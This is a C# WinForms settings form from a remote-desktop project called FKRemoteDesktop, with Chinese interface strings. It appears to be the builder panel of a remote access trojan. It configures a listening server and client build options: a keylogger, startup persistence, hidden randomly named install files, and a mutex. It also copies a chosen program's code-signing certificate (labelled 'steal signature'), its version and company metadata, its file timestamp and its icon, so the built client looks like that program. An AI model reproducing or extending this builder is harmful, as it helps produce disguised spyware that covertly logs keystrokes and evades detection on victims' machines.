using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Structs;
using System;
using System.Linq;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Security.Cryptography;
using Vestris.ResourceLib;
using FKRemoteDesktop.Builder;
using System.Reflection;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class SettingForm : Form
    {
        private readonly FKServer _fkServer;
        private readonly BindingList<SHost> _hosts = new BindingList<SHost>();
        private bool _profileLoaded;
        private bool _settingChanged;

        public SettingForm(FKServer fkServer)
        {
            this._fkServer = fkServer;

            InitializeComponent();
            ToggleListenerSettings(!_fkServer.Listening);
        }

        #region UI事件

        private void SettingForm_Load(object sender, EventArgs e)
        {
            UpdateServerPage();

            lstHosts.DataSource = new BindingSource(_hosts, null);
            LoadClientConfigToUI("Default");
            numericUpDownPort.Value = ServerConfig.ListenPort;  // 使用服务器的监听端口

            UpdateClientAdvancePage();
        }

        private void SettingForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!CheckUIConfigInvalid())
                return;
            if (_settingChanged &&
                MessageBox.Show(this, "保存已更改的配置吗?", "发现有配置更变",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveClientConfigFromUI("Default");
            }
        }

        // 点击 添加服务器信息 按钮
        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1) 
                return;

            HasChanged();

            var host = txtHost.Text;
            ushort port = (ushort)numericUpDownPort.Value;
            _hosts.Add(new SHost { Hostname = host, Port = port });
            txtHost.Text = "";
        }

        // 点击 取消 按钮
        private void btnCancel_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("放弃所有已做的更改吗?", "取消", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
    DialogResult.Yes)
            this.Close();
        }

        // 点击 保存 按钮
        private void btnSave_Click(object sender, EventArgs e)
        {
            SaveServerPage();
            if (!CheckUIConfigInvalid())
                return;
            SaveClientConfigFromUI("Default");
            this.Close();
        }

        // 点击 开启/关闭 服务器监听 按钮
        private void btnListen_Click(object sender, EventArgs e)
        {
            ushort port = GetPortSafe();
            if (port == 0)
            {
                MessageBox.Show("请输入有效端口，值在 1 - 65535 之间.", "请输入有效端口", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            if (btnListen.Text == "开始服务器监听" && !_fkServer.Listening)
            {
                try
                {
                    _fkServer.Listen(port, chkIPv6Support.Checked, chkUseUpnp.Checked);
                    ToggleListenerSettings(false);
                }
                catch (SocketException ex)
                {
                    if (ex.ErrorCode == 10048)
                    {
                        MessageBox.Show(this, "当前端口已被占用.", "Socket 错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else
                    {
                        MessageBox.Show(this, $"错误信息: {ex.Message}\n\n错误码: {ex.ErrorCode}\n\n", "Socket 错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    _fkServer.Disconnect();
                }
                catch (Exception)
                {
                    _fkServer.Disconnect();
                }
            }
            else if (btnListen.Text == "停止服务器监听" && _fkServer.Listening)
            {
                _fkServer.Disconnect();
                ToggleListenerSettings(true);
            }
        }

        // 点击 创建互斥锁 按钮 
        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void btnBrowseSignature_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择窃取签名的目标应用程序";
                ofd.Filter = "可执行程序 *.exe|*.exe";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtCopySignaturePath.Text = ofd.FileName;
                    string sigFile = GetSignature(ofd.FileName);
                    MessageBox.Show("证书文件保存在 : " + sigFile);
                }
            }
        }

        private void btnBrowseAssemblyInfo_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择窃取信息的目标应用程序";
                ofd.Filter = "可执行程序 *.exe|*.exe";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtCopyAssemblyInfoPath.Text = ofd.FileName;
                    // 拷贝EXE的基本信息
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(ofd.FileName);
                    txtProductName.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtCompanyName.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;
                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    
                    FileInfo fileInfo = new FileInfo(ofd.FileName);
                    txtMofifyTime.Text = fileInfo.LastWriteTime.ToString();
                }
            }
        }

        private void btnBrowseAssemblyIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择窃取Icon图标的目标应用程序";
                ofd.Filter = "可执行程序 *.exe|*.exe";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtCopyIconInfoPath.Text = ofd.FileName;
                    string icoFile = GetIcon(ofd.FileName);
                    iconPreview.Image = Bitmap.FromHicon(new Icon(icoFile, new Size(48, 48)).Handle);
                    MessageBox.Show("Icon文件保存在 : " + icoFile);
                }
            }
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择 Icon 文件";
                ofd.Filter = "Icons *.ico|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(48, 48)).Handle);
                }
            }
        }

        // 移除指定服务器信息
        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in lstHosts.SelectedItems select arr.ToString()).ToList();
            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        // 移除全部服务器信息
        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }

        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void chkHideFileAndRandomName_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
        }


        private void chkCopySignature_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateClientAdvancePage();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateClientAdvancePage();
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateClientAdvancePage();
        }

        private void txtTag_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void numericUpDownDelay_ValueChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtMutex_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtCopySignaturePath_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtCopyAssemblyInfoPath_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtCopyIconInfoPath_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtIconPath_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void txtAssemblyInfo_TextChanged(object sender, EventArgs e)
        {
            HasChanged();
        }

        #endregion

        private void UpdateServerPage()
        {
            ncPort.Value = ServerConfig.ListenPort;
            chkIPv6Support.Checked = ServerConfig.IPv6Support;
            chkAutoListen.Checked = ServerConfig.AutoListen;
            chkUseUpnp.Checked = ServerConfig.UseUPnP;
        }

        private void UpdateClientAdvancePage()
        {
            btnBrowseSignature.Enabled = chkCopySignature.Checked;
            btnBrowseAssemblyInfo.Enabled = chkChangeAsmInfo.Checked;

            txtProductName.Enabled = chkChangeAsmInfo.Checked;
            txtDescription.Enabled = chkChangeAsmInfo.Checked;
            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
            txtMofifyTime.Enabled = chkChangeAsmInfo.Checked;

            btnBrowseIcon.Enabled = chkChangeIcon.Checked;
            btnBrowseAssemblyIcon.Enabled = chkChangeIcon.Checked;
        }

        private void ToggleListenerSettings(bool enabled)
        {
            btnListen.Text = enabled ? "开始服务器监听" : "停止服务器监听";
            ncPort.Enabled = enabled;
            chkIPv6Support.Enabled = enabled;
            chkUseUpnp.Enabled = enabled;
        }

        private ushort GetPortSafe()
        {
            var portValue = ncPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        private void SaveServerPage()
        {
            ushort port = GetPortSafe();
            if (port == 0)
            {
                MessageBox.Show("请输入有效端口，值在 1 - 65535 之间.", "请输入有效端口", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            ServerConfig.ListenPort = port;
            ServerConfig.IPv6Support = chkIPv6Support.Checked;
            ServerConfig.AutoListen = chkAutoListen.Checked;
            ServerConfig.UseUPnP = chkUseUpnp.Checked;
        }

        private void LoadClientConfigToUI(string profileName)
        {
            var clientConfig = new ClientConfig(profileName);

            _hosts.Clear();
            foreach (var host in HostsConverterHelper.RawHostsToList(clientConfig.Hosts))
                _hosts.Add(host);
            numericUpDownDelay.Value = clientConfig.Delay;
            txtTag.Text = clientConfig.Tag;
            txtMutex.Text = clientConfig.Mutex;
            chkKeylogger.Checked = clientConfig.Keylogger;
            chkInstall.Checked = clientConfig.InstallClient;
            chkStartup.Checked = clientConfig.AddStartup;
            chkHideFileAndRandomName.Checked = clientConfig.HideFileAndRandomName;

            chkCopySignature.Checked = clientConfig.ChangeSignature;
            txtCopySignaturePath.Text = clientConfig.CopySignaturePath;
            chkChangeAsmInfo.Checked = clientConfig.ChangeAsmInfo;
            txtCopyAssemblyInfoPath.Text = clientConfig.CopyAsmInfoPath;
            txtProductName.Text = clientConfig.ProductName;
            txtDescription.Text = clientConfig.Description;
            txtCompanyName.Text = clientConfig.CompanyName;
            txtCopyright.Text = clientConfig.Copyright;
            txtTrademarks.Text = clientConfig.Trademarks;
            txtOriginalFilename.Text = clientConfig.OriginalFilename;
            txtProductVersion.Text = clientConfig.ProductVersion;
            txtFileVersion.Text = clientConfig.FileVersion;
            txtMofifyTime.Text = clientConfig.MotifyTime;
            chkChangeIcon.Checked = clientConfig.ChangeIcon;
            txtCopyIconInfoPath.Text = clientConfig.CopyIconInfoPath;
            txtIconPath.Text = clientConfig.IconPath;

            if (!string.IsNullOrWhiteSpace(txtIconPath.Text) && File.Exists(txtIconPath.Text))
                iconPreview.Image = Bitmap.FromHicon(new Icon(txtIconPath.Text, new Size(48, 48)).Handle);
            else if (!string.IsNullOrWhiteSpace(txtCopyIconInfoPath.Text) && File.Exists(txtCopyIconInfoPath.Text))
            {
                string icoFile = GetIcon(txtCopyIconInfoPath.Text);
                iconPreview.Image = Bitmap.FromHicon(new Icon(icoFile, new Size(48, 48)).Handle);
            }

            _profileLoaded = true;
        }

        private void SaveClientConfigFromUI(string profileName)
        {
            var clientConfig = new ClientConfig(profileName);

            clientConfig.Hosts = HostsConverterHelper.ListToRawHosts(_hosts);
            clientConfig.Delay = (int)numericUpDownDelay.Value;
            clientConfig.Tag = txtTag.Text;
            clientConfig.Mutex = txtMutex.Text;
            clientConfig.Keylogger = chkKeylogger.Checked;
            clientConfig.InstallClient = chkInstall.Checked;
            clientConfig.AddStartup = chkStartup.Checked;
            clientConfig.HideFileAndRandomName = chkHideFileAndRandomName.Checked;

            clientConfig.ChangeSignature = chkCopySignature.Checked;
            clientConfig.CopySignaturePath = txtCopySignaturePath.Text;
            clientConfig.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            clientConfig.CopyAsmInfoPath = txtCopyAssemblyInfoPath.Text;
            clientConfig.ProductName = txtProductName.Text;
            clientConfig.Description = txtDescription.Text;
            clientConfig.CompanyName = txtCompanyName.Text;
            clientConfig.Copyright = txtCopyright.Text;
            clientConfig.Trademarks = txtTrademarks.Text;
            clientConfig.OriginalFilename = txtOriginalFilename.Text;
            clientConfig.ProductVersion = txtProductVersion.Text;
            clientConfig.FileVersion = txtFileVersion.Text;
            clientConfig.MotifyTime = txtMofifyTime.Text;
            clientConfig.ChangeIcon = chkChangeIcon.Checked;
            clientConfig.CopyIconInfoPath = txtCopyIconInfoPath.Text;
            clientConfig.IconPath = txtIconPath.Text;
        }

        private void HasChanged()
        {
            if (!_settingChanged && _profileLoaded)
                _settingChanged = true;
        }

        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && _hosts.Count > 0);
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
            return match.Success;
        }

        private bool CheckUIConfigInvalid()
        {
            if (!CheckForEmptyInput())
            {
                MessageBox.Show("请填写全部必要信息。要求包括最少一个客户端连接的服务器信息，用户分组标签和互斥锁。", "信息缺失", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            string rawHosts = HostsConverterHelper.ListToRawHosts(_hosts);
            if (rawHosts.Length < 2)
            {
                MessageBox.Show("请输入一个有效的连接服务器.", "信息缺失", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            if (chkChangeIcon.Checked)
            {
                if ((string.IsNullOrWhiteSpace(txtIconPath.Text) || !File.Exists(txtIconPath.Text))
                    && (string.IsNullOrWhiteSpace(txtCopyIconInfoPath.Text) || !File.Exists(txtCopyIconInfoPath.Text)))
                {
                    MessageBox.Show("请选择一个有效的Icon文件 或 一个有效的exe文件.", "信息缺失", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }

            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text))
                {
                    MessageBox.Show("请输入一个有效的产品版本号格式!\n例如: 1.2.3.4", "信息格式错误", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }

                if (!IsValidVersionNumber(txtFileVersion.Text))
                {
                    MessageBox.Show("请输入一个有效的产品版本号格式!\n例如: 1.2.3.4", "信息格式错误", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }

            return true;
        }

        private string GetIcon(string exePath)
        {
            try
            {
                // 获取当前执行的 EXE 文件所在目录
                string currentExeDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                // 获取 exePath 的文件名（不含扩展名）
                string filenameWithoutExt = Path.GetFileNameWithoutExtension(exePath);

                // 构造 .ico 文件路径，使用当前 EXE 目录，文件名与 exePath 一致但后缀为 .ico
                string iconFile = Path.Combine(currentExeDirectory, filenameWithoutExt + ".ico");
                using (FileStream fs = new FileStream(iconFile, FileMode.Create))
                {
                    IconExtractorHelper.Extract1stIconTo(exePath, fs);
                }
                return iconFile;
            }
            catch { }
            return "";
        }

        private string GetSignature(string exePath)
        {
            try
            {
                // 获取当前执行的 EXE 文件所在目录
                string currentExeDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                // 获取 exePath 的文件名（不含扩展名）
                string filenameWithoutExt = Path.GetFileNameWithoutExtension(exePath);
                // 构造 cert 文件完整路径
                string certFile = Path.Combine(currentExeDirectory, filenameWithoutExt + ".p7b");
                PEFileInfoHelper.OutputCert(exePath, certFile);
                return certFile;
            }
            catch { }
            return "";
        }
    }
}
